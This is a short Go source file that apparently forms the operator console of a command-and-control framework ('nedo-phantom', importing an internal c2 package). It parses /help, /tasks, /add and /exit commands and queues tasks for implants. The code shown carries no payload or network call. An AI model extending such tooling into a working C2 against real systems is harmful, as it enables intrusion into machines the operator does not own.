package cli

import (
    "fmt"
    "os"
    "strings"
    "time"
    
    "nedo-phantom/internal/c2/db"
    "nedo-phantom/internal/common"
)

type Commander struct {
    tasks *db.TaskQueue
}

func NewCommander(tasks *db.TaskQueue) *Commander {
    return &Commander{tasks: tasks}
}

// Handle обрабатывает команду оператора
func (c *Commander) Handle(cmd string) {
    parts := strings.Fields(cmd)
    if len(parts) == 0 {
        fmt.Print("> ")
        return
    }

    switch parts[0] {
    case "/help":
        c.printHelp()
    case "/tasks":
        c.listTasks()
    case "/add":
        c.addTask(parts)
    case "/exit":
        fmt.Println("Exiting...")
        os.Exit(0)
    default:
        fmt.Printf("Unknown command: %s. Type /help\n", parts[0])
    }
    
    fmt.Print("> ")
}

func (c *Commander) printHelp() {
    fmt.Print("\r\nCommands: /help, /tasks, /add <type> <data>, /exit")
}

func (c *Commander) listTasks() {
    tasks := c.tasks.GetTasks()
    if len(tasks) == 0 {
        fmt.Print("\r\nNo tasks")
        return
    }
    fmt.Print("\r\n")
    for _, task := range tasks {
        fmt.Printf("  %s: %s (status: %s)\r\n", task.ID, task.Type, task.Status)
    }
}

func (c *Commander) addTask(parts []string) {
    if len(parts) < 2 {
        fmt.Print("\r\nUsage: /add <type> [data]")
        return
    }

    var data interface{}
    if len(parts) >= 3 {
        data = strings.Join(parts[2:], " ")
    }

    task := common.Task{
        ID:     fmt.Sprintf("task_%d", time.Now().UnixNano()),
        Type:   parts[1],
        Data:   data,
        Status: "pending",
    }
    c.tasks.AddTask(task)
    fmt.Printf("\r\nTask %s added", task.ID)
}
